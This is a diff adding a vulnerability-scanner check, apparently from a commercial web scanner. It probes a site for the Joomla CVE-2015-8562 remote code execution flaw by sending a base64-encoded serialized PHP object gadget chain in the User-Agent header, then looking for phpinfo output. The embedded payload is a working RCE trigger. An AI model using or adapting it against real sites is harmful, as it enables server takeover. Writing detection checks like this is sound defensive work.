@@ -1,0 +1,73 @@
+#include constants.inc;
+#include helpers.inc;
+#include debug_helpers.inc;
+#include string_helpers.inc;
+#include cookies_helpers.inc;
+var lastJob = null;
+var cookieName  = "";
+var cookieValue = "";
+// **************************************************************************************							 
+function request(dir, uri, userAgent, cookieString)
+{
+	lastJob = new THTTPJob();
+	lastJob.verb = "GET";
+	lastJob.url  = dir.url;
+	lastJob.uri  = uri;
+    lastJob.addCookies = false;
+	if (userAgent)
+		lastJob.request.addHeader("User-Agent", userAgent, true);
+    if (cookieString)
+        lastJob.request.addHeader("Cookie", cookieString, true);
+    lastJob.execute();
+	if (lastJob.wasError) return false;
+	else {
+        if (!cookieName) {
+            // extract cookies
+            var cookies = extractCookiesFromResponse(lastJob.response);
+            for (name in cookies) {
+                if (name && name.length == 32) {
+                    cookieName = name;
+                    cookieValue = cookies[name];
+                    break;
+                }
+            }
+        }
+    }
+    return true;
+}
+// **************************************************************************************							 
+function alert(uri, vxml, matchedText)
+{
+	var ri = new TReportItem();
+	ri.LoadFromFile(vxml);
+	ri.affects = uri;
+	ri.alertPath = "Scripts/Joomla";
+	ri.setHttpInfo(lastJob);
+    if (matchedText)
+        ri.Details =  ri.Details + "[break]Pattern found: [dark][bold]" + matchedText + "[/bold][/dark]";
+	AddReportItem(ri);
+}
+// **************************************************************************************
+function testForJoomlaRCE(dir) {
+	var root_path = dir.fullPath;
+	if (root_path.charAt(root_path.length-1) != '/') root_path = root_path + '/';
+    var exploit =  b642plain("fV9fdGVzdHxPOjIxOiJKRGF0YWJhc2VEcml2ZXJNeXNxbGkiOjM6e3M6MjoiZmMiO086MTc6IkpTaW1wbGVwaWVGYWN0b3J5IjowOnt9czoyMToiXDBcMFwwZGlzY29ubmVjdEhhbmRsZXJzIjthOjE6e2k6MDthOjI6e2k6MDtPOjk6IlNpbXBsZVBpZSI6NTp7czo4OiJzYW5pdGl6ZSI7TzoyMDoiSkRhdGFiYXNlRHJpdmVyTXlzcWwiOjA6e31zOjg6ImZlZWRfdXJsIjtzOjExOToiZXZhbChjaHIoMTEyKS5jaHIoMTA0KS5jaHIoMTEyKS5jaHIoMTA1KS5jaHIoMTEwKS5jaHIoMTAyKS5jaHIoMTExKS5jaHIoNDApLmNocig0MSkuY2hyKDU5KSk7SkZhY3Rvcnk6OmdldENvbmZpZygpO2V4aXQiO3M6MTk6ImNhY2hlX25hbWVfZnVuY3Rpb24iO3M6NjoiYXNzZXJ0IjtzOjU6ImNhY2hlIjtiOjE7czoxMToiY2FjaGVfY2xhc3MiO086MjA6IkpEYXRhYmFzZURyaXZlck15c3FsIjowOnt9fWk6MTtzOjQ6ImluaXQiO319czoxMzoiXDBcMFwwY29ubmVjdGlvbiI7YjoxO33w/f39");
+    var exploitSearchText = "<title>phpinfo()</title>";
+	if (request(dir, root_path, exploit, ""))
+	{
+        if (cookieName && cookieValue && lastJob.response.body.indexOf(exploitSearchText) == -1) {
+            var cookieString = cookieName + "=" + cookieValue;
+            for (var i=0; i<2; i++) {
+                if (request(dir, root_path, exploit, cookieString)) {
+                    if (lastJob.response.body.indexOf(exploitSearchText) != -1) {
+                        alert(root_path, "Joomla_CVE-2015-8562.xml", exploitSearchText);
+                        break;
+                    }
+                }
+            }
+        }
+	}
+}
+// main()
+var dir = getCurrentDirectory();
+testForJoomlaRCE(dir);
